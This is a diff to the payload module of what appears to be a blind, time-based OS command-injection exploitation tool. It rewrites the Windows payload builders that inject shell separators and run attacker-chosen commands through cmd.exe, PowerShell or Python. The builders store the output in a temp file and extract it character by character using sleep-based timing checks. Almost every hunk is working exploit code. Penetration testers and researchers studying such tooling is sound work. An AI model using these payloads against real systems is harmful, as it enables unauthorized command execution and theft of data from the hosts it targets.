@@ -23,31 +23,33 @@ The available "tempfile-based" payloads.
 """
 
 """
+The file's contents as one line of text, joined and trimmed the same way every payload here reads
+it, so a length and the characters counted off it always agree.
+"""
+def windows_file_text(OUTPUT_TEXTFILE):
+  return "([string](Get-Content " + OUTPUT_TEXTFILE + ")).trim()"
+
+"""
+A command's output as one line of text. Multi-line output is joined, so a single number describes
+its length however many lines it came in.
+"""
+def windows_cmd_text(cmd):
+  return "([string](cmd /c " + cmd + ")).trim()"
+
+"""
 Tempfile-based decision payload (check if host is vulnerable).
 """
 def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
-                "((Get-Content " + OUTPUT_TEXTFILE + ").length)\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+    chain = checks.windows_separator(separator)
+    if chain is not None:
+      payload = (chain +
+                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" +
+                checks.windows_probe(checks.WINDOWS_CHAIN,
+                                     "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) + ".length",
+                                     "EQU", j, timesec)
                 )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
-                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
-                "((Get-Content " + OUTPUT_TEXTFILE + ").length)\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
-                )
-    else:
-      pass
 
   else:
     if separator in (";", "%0a", "%0d%0a") :
@@ -99,27 +101,13 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
+    chain = checks.windows_separator(separator)
+    if chain is not None:
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
+      payload = (chain +
+                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" +
+                checks.windows_probe(checks.WINDOWS_CHAIN, python_payload, "EQU", j, timesec)
                 )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
-                )
-    else:
-      pass
 
   else:
     if separator in (";", "%0a", "%0d%0a") :
@@ -178,14 +166,14 @@ def condition_check(separator, condition, timesec, http_request_method):
               "[ " + condition + " ]" + "&&" +
               "sleep " + str(timesec)
               )
-  elif separator == _urllib.parse.quote("&&"):
+  elif separator in (_urllib.parse.quote("&"), _urllib.parse.quote("&&"), ""):
     payload = (_urllib.parse.quote("&") +
               "sleep 0" + separator +
               "[ " + condition + " ]" + separator +
               "sleep " + str(timesec)
               )
   elif separator in ("|", "||"):
-    pipe = "|"
+    pipe = separator
     payload = (pipe +
               "[ ! " + condition + " ]" + "||" +
               "sleep " + str(timesec)
@@ -199,46 +187,38 @@ def condition_check(separator, condition, timesec, http_request_method):
   return checks.sanitize_payload_newlines(payload)
 
 """
+Windows counterpart of condition_check() above - 'set /a' has no boolean test operator, so an
+equality check is read off a subtraction landing on the expected value.
+"""
+def windows_condition_check(separator, expr, expected, timesec):
+  chain = checks.windows_separator(separator)
+  if chain is None:
+    return None
+  return checks.windows_probe(chain, "set /a " + expr, "==", expected, timesec)
+
+"""
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-le"):
   payload = ""
   inverted_operator = "-gt" if operator == "-le" else "-ne"
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c \"" +
-                cmd +
-                "\"') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + pipe +
-                "for /f \"tokens=*\" %y in ('cmd /c \"powershell.exe -InputFormat none "
-                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
-                "do if %y==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\"" +
-                # Transform to ASCII
-                pipe +
-                "for /f \"tokens=*\" %x in ('cmd /c \"" +
-                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"')" + settings.SINGLE_WHITESPACE +
-                "do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%x'"
+    chain = checks.windows_separator(separator)
+    if chain is not None:
+      # 'GEQ', so the length can be binary searched - an equality test only ever answers the one
+      # candidate it is given.
+      win_operator = "GEQ" if operator == "-le" else "EQU"
+      # Stored as one decimal per character: extraction reads a character off it by number, and
+      # their count is the length being searched for.
+      ascii_output = ("powershell.exe -InputFormat none write-host ([int[]][char[]](" +
+                      windows_cmd_text(cmd) + "))")
+      payload = (chain +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" + ascii_output + "\"') do " +
+                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
+                checks.windows_probe(checks.WINDOWS_CHAIN,
+                                     "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) + ".split([char]32).length",
+                                     win_operator, j, timesec)
                 )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-               "for /f \"tokens=*\" %i in ('cmd /c \"" +
-                cmd +
-                "\"') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + ampersand +
-                "for /f \"tokens=*\" %y in ('cmd /c \"powershell.exe -InputFormat none "
-                "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
-                "do if %y==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\"" +
-                # Transform to ASCII
-                ampersand +
-                "for /f \"tokens=*\" %x in ('cmd /c \"" +
-                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"')" + settings.SINGLE_WHITESPACE +
-                "do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%x'"
-                )
-    else:
-      pass
   else:
     settings.USER_APPLIED_CMD = cmd
     if separator in (";", "%0a", "%0d%0a") :
@@ -305,31 +285,14 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                cmd +
-                "') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
+    chain = checks.windows_separator(separator)
+    if chain is not None:
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
+      payload = (chain +
+                "for /f \"tokens=*\" %i in ('cmd /c " + cmd + "') do " +
+                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
+                checks.windows_probe(checks.WINDOWS_CHAIN, python_payload, "EQU", j, timesec)
                 )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                cmd +
-                "') do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" + ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
-                )
-    else:
-      pass
   else:
     settings.USER_APPLIED_CMD = cmd
     if separator in (";", "%0a", "%0d%0a") :
@@ -378,24 +341,13 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
   win_operator = "GEQ" if operator == "-le" else "EQU"
   inverted_operator = "-gt" if operator == "-le" else "-ne"
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
-                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
-                )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
-                "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
-                )
-    else:
-      pass
+    chain = checks.windows_separator(separator)
+    if chain is not None:
+      # Split on '[char]32', so no quote of its own has to survive cmd.exe's own quote handling.
+      payload = checks.windows_probe(chain,
+                                     "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) +
+                                     ".split([char]32)[" + str(num_of_chars - 1) + "]",
+                                     win_operator, ascii_char, timesec)
   else:
     if separator in (";", "%0a", "%0d%0a") :
       arith_operator = "<=" if operator == "-le" else "=="
@@ -442,26 +394,10 @@ def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_c
   inverted_operator = "-gt" if operator == "-le" else "-ne"
   arith_operator = "<=" if operator == "-le" else "=="
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
-                )
-
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
-                )
-    else:
-      pass
+    chain = checks.windows_separator(separator)
+    if chain is not None:
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
+      payload = checks.windows_probe(chain, python_payload, win_operator, ascii_char, timesec)
 
   else:
     if separator in (";", "%0a", "%0d%0a") :
@@ -498,89 +434,15 @@ def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_c
   return checks.sanitize_payload_newlines(payload)
 
 """
-Get the execution output, of shell execution.
-"""
-def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
-  payload = ""
-  if settings.TARGET_OS == settings.OS.WINDOWS:
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
-                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
-                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
-                )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
-                "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
-                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
-                )
-    else:
-      pass
-
-  else:
-    if separator in (";", "%0a", "%0d%0a") :
-      payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "sleep $((" + str(timesec) + "*(" + str(ord(str(ascii_char))) + "==${" + settings.RANDOM_VAR_GENERATOR + "})))"
-                )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                "sleep 0" + separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "[ " + str(ord(str(ascii_char))) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
-                "sleep " + str(timesec)
-                )
-      separator = _urllib.parse.unquote(separator)
-    elif separator == "%26":
-      payload = (separator +
-                "[ " + str(ord(str(ascii_char))) + " -eq $(cut -c1-2 " + OUTPUT_TEXTFILE + ") ]" + "&&" +
-                "sleep " + str(timesec)
-                )
-    elif separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                "[ " + str(ascii_char) + " -ne  " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + ") ] " + "||" +
-                "sleep " + str(timesec)
-                )
-    else:
-      pass
-
-    if settings.CUSTOM_INJECTION_MARKER:
-      payload = checks.append_custom_marker(payload, separator)
-
-  return payload
-
-"""
 __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
-    if separator in ("|", "||"):
-      pipe = "|"
-      payload = (pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
-                )
-    elif separator == _urllib.parse.quote("&&") :
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
-                )
-    else:
-      pass
+    chain = checks.windows_separator(separator)
+    if chain is not None:
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
+      payload = checks.windows_probe(chain, python_payload, "EQU", ascii_char, timesec)
   else:
     if separator in (";", "%0a", "%0d%0a") :
       payload = (separator +
